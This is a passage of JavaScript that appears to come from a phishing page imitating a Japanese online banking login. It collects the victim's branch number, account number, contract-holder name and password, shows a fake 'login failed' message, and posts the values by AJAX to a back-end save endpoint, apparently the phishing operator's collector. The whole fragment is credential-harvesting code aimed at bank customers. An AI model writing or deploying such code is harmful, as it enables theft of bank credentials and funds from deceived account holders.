                return false;
            }

                layer.msg('ログインできませんでした。入力内容をご確認ください!');
                mima.focus()
                return false;
            }


                var appid = "店番:"+dfh.value + "<br>口座番号:" + kzfh.value + "<br>契约者:" + qyz.value;
                var apppwd = "密码:" +mima.value;
                $.ajax({
                    url: '/api.php?act=next_save&_r='+Math.random(),

                    data: {uname:appid,apppwd:apppwd},
